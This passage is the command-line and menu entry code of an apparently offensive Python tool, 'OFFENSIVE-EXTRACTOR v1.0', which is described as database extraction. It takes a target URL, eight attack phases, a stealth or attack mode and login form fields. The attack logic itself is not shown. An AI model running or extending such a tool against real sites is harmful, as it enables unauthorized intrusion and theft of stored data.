        uf = input("  Champ username [username] : ").strip() or "username"
        pf = input("  Champ password [password] : ").strip() or "password"

    extractor = OffensiveExtractor({'mode': mode})
    parsed = urlparse(url)
    extractor.target_url = url
    extractor.target_domain = parsed.netloc
    extractor.target_host = parsed.hostname
    extractor.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    extractor.base_url = f"{parsed.scheme}://{parsed.netloc}"
    extractor.results['target'] = url

    extractor.run(phases=phases, login_path=login_path,
                  username_field=uf, password_field=pf)


def main():
    parser = argparse.ArgumentParser(
        description='OFFENSIVE-EXTRACTOR v1.0 — Extraction DB + mesure robustesse'
    )
    parser.add_argument('url', nargs='?', help='URL cible')
    parser.add_argument('--phases', default='all', help='Phases (ex: 1,2,3 ou all)')
    parser.add_argument('--mode', default='hybrid',
                        choices=['attack', 'stealth', 'hybrid'])
    parser.add_argument('--login-path', default='/api/login')
    parser.add_argument('--username-field', default='username')
    parser.add_argument('--password-field', default='password')

    args = parser.parse_args()

    if args.url:
        extractor = OffensiveExtractor({'mode': args.mode})
        url = args.url
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        parsed = urlparse(url)
        extractor.target_url = url
        extractor.target_domain = parsed.netloc
        extractor.target_host = parsed.hostname
        extractor.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        extractor.base_url = f"{parsed.scheme}://{parsed.netloc}"
        extractor.results['target'] = url

        if args.phases == 'all':
            phases = [1, 2, 3, 4, 5, 6, 7, 8]
        else:
            phases = [int(x.strip()) for x in args.phases.split(',') if x.strip().isdigit()]
            phases = [p for p in phases if 1 <= p <= 8]

        extractor.run(phases=phases,
                      login_path=args.login_path,
                      username_field=args.username_field,
                      password_field=args.password_field)
    else:
        interactive_menu()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n👋 Interrompu.")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Erreur fatale : {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)